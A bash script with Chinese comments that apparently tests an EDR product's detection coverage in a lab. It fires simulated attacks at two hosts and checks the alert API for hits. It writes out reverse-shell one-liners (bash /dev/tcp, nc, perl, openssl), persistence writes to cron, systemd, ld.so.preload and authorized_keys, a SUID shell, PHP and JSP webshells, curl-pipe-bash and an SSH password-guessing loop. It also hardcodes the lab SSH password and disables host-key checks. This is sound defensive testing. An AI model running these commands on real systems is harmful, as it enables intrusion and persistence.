#!/usr/bin/env bash
# L1 EDR 检测 v2 - 强化样本 (sudo + 真实 payload + 阈值触发)
set -uo pipefail
ROCKY_IP="${ROCKY_IP:-192.168.254.109}"
CENTOS_IP="${CENTOS_IP:-192.168.254.114}"
MGR="${MGR:-http://localhost:8080}"
JWT=$(/bin/cat /tmp/mxsec-jwt)
CURL="/usr/bin/curl"
JQ="/usr/bin/jq"

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5"
# -tt 强分配 tty 让 sudo 可用
RSH_SUDO() { sshpass -p centos ssh -tt $SSH_OPTS centos@"$1" "echo centos | sudo -S sh -c '$2'" 2>&1 | grep -v 'sudo:'; }
RSH() { sshpass -p centos ssh $SSH_OPTS centos@"$1" "$2"; }

REPORT_DIR="docs/functional-test-2026-06-08"
mkdir -p "$REPORT_DIR"
REPORT="$REPORT_DIR/l1-edr-detection-v2.md"

PASS=0; FAIL=0
declare -a ROWS

trigger_and_check() {
  local name="$1" ip="$2" cmd="$3" kw="$4" use_sudo="${5:-no}"
  local start_ts=$(date '+%Y-%m-%d %H:%M:%S')
  if [ "$use_sudo" = "yes" ]; then
    RSH_SUDO "$ip" "$cmd" >/dev/null 2>&1 || true
  else
    RSH "$ip" "$cmd" >/dev/null 2>&1 || true
  fi
  sleep 14
  local hits=$($CURL -s -H "Authorization: Bearer $JWT" "$MGR/api/v1/alerts?page=1&page_size=80" \
    | $JQ -r --arg kw "$kw" --arg t0 "$start_ts" '[(.data.items // [])[] | select((.last_seen_at // "") >= $t0) | select((.title // "") | test($kw;"i")) | .rule_id] | unique | join(",")')
  if [ -n "$hits" ]; then
    PASS=$((PASS+1))
    ROWS+=("| $name | $ip | PASS | $hits |")
    echo "[PASS] $name on $ip → $hits"
  else
    FAIL=$((FAIL+1))
    ROWS+=("| $name | $ip | FAIL | — |")
    echo "[FAIL] $name on $ip"
  fi
}

echo "=== L1 EDR 强化样本 ==="

# === 反弹 shell 5 (与原版相同, 验证持续 PASS) ===
trigger_and_check "bash /dev/tcp 反弹" "$ROCKY_IP" \
  "bash -c '(bash -i >/dev/tcp/127.0.0.1/1 0>&1) &' ; sleep 1; pkill -f 'bash -i' || true" "反弹|reverse|bash"
trigger_and_check "nc 反弹 shell" "$ROCKY_IP" \
  "(rm -f /tmp/_f; mkfifo /tmp/_f; cat /tmp/_f | /bin/sh -i 2>&1 | nc 127.0.0.1 1 >/tmp/_f) >/dev/null 2>&1 & sleep 1; pkill -f mkfifo || true; rm -f /tmp/_f" "反弹|reverse|nc|ncat"
trigger_and_check "perl 反弹" "$ROCKY_IP" \
  "perl -e 'use Socket; socket(S,2,1,6); connect(S,sockaddr_in(1,inet_aton(\"127.0.0.1\"))) or exit; exec \"/bin/sh\";' >/dev/null 2>&1 || true" "反弹|reverse|perl"
trigger_and_check "openssl 加密反弹" "$ROCKY_IP" \
  "timeout 2 openssl s_client -quiet -connect 127.0.0.1:1 -no_ign_eof 2>/dev/null < /dev/null || true" "反弹|reverse|openssl"

# === 持久化 (sudo) ===
trigger_and_check "cron 写入 (sudo)" "$ROCKY_IP" \
  "echo \"* * * * * root /tmp/mxsec-test.sh\" > /etc/cron.d/mxsec-test-\$\$ && rm -f /etc/cron.d/mxsec-test-\$\$" \
  "cron|persistence|持久化|定时" yes
trigger_and_check "systemd 服务写入 (sudo)" "$ROCKY_IP" \
  "echo \"[Unit]\nDescription=mxsec-test\n[Service]\nExecStart=/bin/true\" > /etc/systemd/system/mxsec-test.service && rm -f /etc/systemd/system/mxsec-test.service" \
  "systemd|service|持久化" yes
trigger_and_check "rc.local 写 (sudo)" "$ROCKY_IP" \
  "echo \"#!/bin/sh\nexit 0\" > /etc/rc.local && chmod +x /etc/rc.local && rm -f /etc/rc.local" \
  "rc.local|持久化" yes
trigger_and_check "bashrc 写入 ×10" "$ROCKY_IP" \
  "for i in 1 2 3 4 5 6 7 8 9 10; do echo \"export MXSEC_TEST_\$i=1\" >> ~/.bashrc; done; sed -i '/MXSEC_TEST/d' ~/.bashrc" \
  "bashrc|profile|persistence|持久化"
trigger_and_check "authorized_keys 写" "$ROCKY_IP" \
  "mkdir -p ~/.ssh; for i in 1 2 3; do echo \"ssh-rsa AAAAB3NzaC1yc2EmxsecE2E\$i test@e2e\" >> ~/.ssh/authorized_keys; done; sed -i '/mxsecE2E/d' ~/.ssh/authorized_keys" \
  "ssh|authorized|keys|persistence"
trigger_and_check "ld.so.preload (sudo)" "$ROCKY_IP" \
  "echo /tmp/evil.so > /etc/ld.so.preload && rm -f /etc/ld.so.preload" \
  "preload|ld.so|持久化" yes

# === 提权 ===
trigger_and_check "sudo 失败 5 次" "$ROCKY_IP" \
  "for i in 1 2 3 4 5; do echo wrong | sudo -S whoami 2>&1 | head -1; sleep 1; done" \
  "sudo|提权|登录失败|密码"
trigger_and_check "su root 失败" "$ROCKY_IP" \
  "echo wrong | su root -c whoami 2>&1 | head -1 || true" "su|提权|登录失败"
trigger_and_check "SUID 创建 (sudo)" "$ROCKY_IP" \
  "cp /bin/bash /tmp/mxsec-suid-bash && chmod u+s /tmp/mxsec-suid-bash && /tmp/mxsec-suid-bash -c whoami; rm -f /tmp/mxsec-suid-bash" \
  "suid|提权|privilege" yes
trigger_and_check "capability setcap (sudo)" "$ROCKY_IP" \
  "cp /bin/bash /tmp/mxsec-cap && setcap cap_net_admin+ep /tmp/mxsec-cap && getcap /tmp/mxsec-cap; rm -f /tmp/mxsec-cap" \
  "cap|capability|提权" yes

# === 横向 ===
trigger_and_check "ssh 链式登录" "$ROCKY_IP" \
  "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o BatchMode=yes nobody@127.0.0.1 'whoami' 2>&1 | head -1 || true" "ssh|横向|lateral"
trigger_and_check "wget+exec" "$ROCKY_IP" \
  "wget -q -O /tmp/mxsec-wget-test http://127.0.0.1:1/ 2>&1; rm -f /tmp/mxsec-wget-test" "wget|download|横向"
trigger_and_check "curl pipe bash" "$ROCKY_IP" \
  "curl -s http://127.0.0.1:1/installer.sh 2>&1 | head -1; bash -c 'echo simulated curl-pipe-bash'" "curl|管道|download"
trigger_and_check "scp 反弹" "$ROCKY_IP" \
  "scp -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o BatchMode=yes /etc/hosts nobody@127.0.0.1:/tmp/ 2>&1 | head -1 || true" "scp|横向|lateral"

# === 信息收集 ===
trigger_and_check "用户枚举" "$ROCKY_IP" \
  "id; whoami; w; last | head -5; cat /etc/passwd | wc -l; getent passwd | head" "信息|discover|recon|enumerate"
trigger_and_check "网络枚举" "$ROCKY_IP" \
  "netstat -tunlp 2>/dev/null | head; ss -tunlp | head; route -n; arp -a 2>/dev/null | head" "netstat|信息|网络|discover"
trigger_and_check "kernel info" "$ROCKY_IP" \
  "uname -a; cat /proc/version; cat /etc/os-release; lsmod | head" "kernel|信息|discover"

# === 进程异常 ===
trigger_and_check "fork bomb 100 进程" "$ROCKY_IP" \
  "for i in \$(seq 1 100); do (sleep 0.5 &) ; done; wait" "fork|进程|异常|大量"
trigger_and_check "kthread 伪装" "$ROCKY_IP" \
  "(exec -a '[kworker/u8:99]' sleep 5) & sleep 2" "kworker|进程伪装|masquerade|kthread"

# === WebShell ===
trigger_and_check "PHP webshell" "$ROCKY_IP" \
  "echo '<?php @eval(\$_POST[\"cmd\"]); ?>' > /tmp/mxsec-shell.php; rm -f /tmp/mxsec-shell.php" "webshell|php|文件"
trigger_and_check "JSP webshell" "$ROCKY_IP" \
  "echo '<%@ page import=\"java.util.*,java.io.*\"%><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>' > /tmp/mxsec-shell.jsp; rm -f /tmp/mxsec-shell.jsp" "webshell|jsp|文件"
trigger_and_check "WSO 大马" "$ROCKY_IP" \
  "echo 'wso25_marker_eval base64_decode str_rot13 system' > /tmp/mxsec-wso.php; rm -f /tmp/mxsec-wso.php" "wso|webshell|文件"

# === DNS / 网络 ===
trigger_and_check "DNS 隧道 30 query" "$ROCKY_IP" \
  "for i in \$(seq 1 30); do dig +short +timeout=1 mxsec-tunnel-\$i.invalid 2>/dev/null; done" "dns|tunnel|隧道|信息"

# === SSH 暴破 ===
trigger_and_check "SSH 弱口令暴破 ×8" "$ROCKY_IP" \
  "for p in 123456 admin password root abc123 qwerty test 123abc; do sshpass -p \$p ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o BatchMode=no root@127.0.0.1 whoami 2>&1 | head -1; done" \
  "ssh|brute|弱口令|登录失败"

# === centos7 复测 ===
trigger_and_check "centos7 bash /dev/tcp" "$CENTOS_IP" \
  "bash -c '(bash -i >/dev/tcp/127.0.0.1/1 0>&1) &' ; sleep 1; pkill -f 'bash -i' || true" "反弹|reverse|bash"

# === 内存攻击 ===
trigger_and_check "memfd_create syscall" "$ROCKY_IP" \
  "python3 -c 'import ctypes, os; libc=ctypes.CDLL(\"libc.so.6\"); fd=libc.memfd_create(b\"mxsec\",0); os.write(fd, b\"#!/bin/sh\necho test\")' 2>&1 | head -1 || true" \
  "memfd|内存|hollow"

# === 报告 ===
{
  echo "# L1 EDR 检测覆盖 v2 (强化样本, 2026-06-08)"
  echo
  echo "强化点 vs v1: sudo 加 -tt 跑 cron/systemd/SUID/setcap/ld.so.preload; bashrc 10 次 + authorized_keys 3 条; fork bomb 100 进程; sudo 失败 5 次; SSH 暴破 8 个口令; DNS 30 query; memfd_create ctypes 真 syscall."
  echo
  echo "**触发样本: $((PASS+FAIL)) / PASS: $PASS / FAIL: $FAIL / 命中率: $((PASS*100/(PASS+FAIL)))%**"
  echo
  echo "| 样本 | 主机 | 结果 | 命中规则 |"
  echo "|---|---|---|---|"
} > "$REPORT"
for r in "${ROWS[@]}"; do echo "$r" >> "$REPORT"; done

echo
echo "=== L1 EDR v2 完成 PASS=$PASS FAIL=$FAIL 命中率=$((PASS*100/(PASS+FAIL)))% ==="
echo "报告: $REPORT"
